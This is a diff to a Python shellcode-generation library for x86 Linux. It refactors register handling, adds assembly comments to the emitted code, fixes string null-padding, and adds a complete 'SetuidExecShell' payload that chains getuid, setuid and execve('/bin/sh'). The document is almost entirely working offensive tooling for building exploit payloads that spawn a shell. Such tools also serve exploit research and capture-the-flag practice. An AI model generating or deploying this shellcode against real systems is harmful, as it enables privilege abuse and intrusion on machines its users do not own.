@@ -62,12 +62,11 @@ REG_UNDEFINED=_Register_Content()
 """Register content is not a constant value and must not be erased"""
 REG_RESERVED=_Register_Content()
 
-all_registers_x86 = ["eax","ebx","ecx","edx","esi","edi","ebp","esp"]
-
 class Context(object):
 	cpu = None
 	os = None
 	syscalls = None
+	all_registers = None
 	state = None
 	def __init__(self, cpu=None, OS=None):
 		if cpu is not None:
@@ -79,6 +78,8 @@ class Context(object):
 		else:
 			self.os = config.os()
 		self.syscalls=syscalls[self.cpu][self.os]
+		if(self.cpu == "x86"):
+			self.all_registers = ["eax","ebx","ecx","edx","esi","edi","ebp","esp"]
 		self.state = {}
 
 class ShellcodeSnippet(object):
@@ -156,14 +157,14 @@ class PushArray(ShellcodeSnippet):
 	PushArray(array, dest, ctx=ctx)"""
 	nparams = 2
 	def generate_x86(self):
-		code = ""
+		code = "\n; Pusharray(%s, %s)\n"%(str(self.args[0]), self.args[1])
 		#make a copy
 		array = list(self.args[0])
 		dest = self.args[1]
 		self.ctx.state[dest]=REG_RESERVED
 		array.reverse()
 		for v in array:
-			if v in all_registers_x86:
+			if v in self.ctx.all_registers:
 				code += "push %s\n"%(v)
 			else:
 				code += "push %d\n"%(v)
@@ -176,16 +177,17 @@ class PushString(ShellcodeSnippet):
 	nparams = 2
 	def generate_x86(self):
 		string, dest = self.args
+		code = "\n; PushString(\"%s\", %s)\n"%(string, dest)
 		#push string on stack
 		values = chunkstring(string, 4)
 		# pad the strings with zero
 		values = map(lambda x: x+ "\x00" * (4-len(x)), values)
 		# end the string with zero if it's not null terminated already
 		if len(values)==0 or values[-1][3]!="\x00":
-			values += [0]
+			values += ["\x00" * 4]
 		#convert to integer
 		values = map(lambda x: struct.unpack("<I", x)[0], values)
-		code = PushArray(values, dest, ctx=self.ctx).generate()
+		code += PushArray(values, dest, ctx=self.ctx).generate()
 		return code
 
 class SetRegisters(ShellcodeSnippet):
@@ -195,11 +197,11 @@ class SetRegisters(ShellcodeSnippet):
 	minparams = 1
 	maxparams = 100
 	def generate_x86(self):
-		code = ""
+		code = "\n; SetRegisters(%s)\n"%(self.args,)
 		for reg, value in self.args:
 			if value == REG_UNDEFINED:
 				continue
-			if value in all_registers_x86:
+			if value in self.ctx.all_registers:
 				# mov reg, reg
 				if reg == value:
 					continue
@@ -226,9 +228,10 @@ class Syscall(ShellcodeSnippet):
 	minparams=1
 	maxparams=7
 	def generate_linux_x86(self):
+		code = "\n; Syscall(%s)\n"%(self.args,)
 		params = zip(["eax", "ebx", "ecx", "edx", "esi", "edi", "ebp"],
 					list(self.args)) 
-		code = SetRegisters(*params, ctx=self.ctx).generate()
+		code += SetRegisters(*params, ctx=self.ctx).generate()
 			
 		code += "int 0x80\n"
 		self.ctx.state["eax"]=REG_UNDEFINED
@@ -252,7 +255,7 @@ class Write(ShellcodeSnippet):
 	maxparams = 3
 	def generate_linux_x86(self):
 		fd, data = self.args[:2]
-		if type(data)==str and not data in all_registers_x86:
+		if type(data)==str and not data in self.ctx.all_registers:
 			size = len(data)
 		else:
 			size = self.args[2]
@@ -265,19 +268,25 @@ class Read(ShellcodeSnippet):
 	nparams=3
 	def generate(self):
 		fd, data, size = self.args
-		return Syscall(self.ctx.syscalls["read"],
+		code = "\n; read(%s,%s,%s)\n"%(str(fd),str(data),str(size))
+		code += Syscall(self.ctx.syscalls["read"],
 			fd, data, size, ctx=self.ctx).generate()
+		return code
 
 class Getuid(ShellcodeSnippet):
 	def generate(self):
-		return Syscall(self.ctx.syscalls["getuid"], ctx=self.ctx).generate()
+		code = "\n; getuid()\n"
+		code += Syscall(self.ctx.syscalls["getuid"], ctx=self.ctx).generate()
+		return code
 
 class Setuid(ShellcodeSnippet):
 	nparams=1
 	def generate(self):
 		uid = self.args[0]
-		return Syscall(self.ctx.syscalls["setuid"], uid,
+		code = "\n; setuid(%s)\n"%(str(uid),)
+		code += Syscall(self.ctx.syscalls["setuid"], uid,
 			ctx=self.ctx).generate()
+		return code
 
 class Execve(ShellcodeSnippet):
 	"""Execve(filename, param1, ..., ctx=self.ctx)
@@ -286,7 +295,7 @@ class Execve(ShellcodeSnippet):
 	maxparams=2
 	def generate_linux_x86(self):
 		filename = self.args[0]
-		code = ""
+		code = "; Execve(%s, %s, [NULL])\n"%(filename, self.args)
 		code += PushString(filename, "ebx", ctx=self.ctx).generate()
 		#environ
 		code += PushArray([0], "edx", ctx=self.ctx).generate()
@@ -298,4 +307,15 @@ class Execve(ShellcodeSnippet):
 			code += PushArray(["ebx", 0], "ecx", ctx=self.ctx).generate()
 		code += Syscall(self.ctx.syscalls["execve"],
 			"ebx", "ecx", "edx", ctx=self.ctx).generate()
+		return code
+
+# Complete shellcodes
+
+class SetuidExecShell(ShellcodeSnippet):
+	"""setuid(getuid) + execve("/bin/sh") shellcode"""
+	def generate_x86(self):
+		code = Getuid().generate()
+		code += SetRegisters(("ebx","eax")).generate()
+		code += Setuid("ebx").generate()
+		code += Execve("/bin/sh").generate()
 		return code
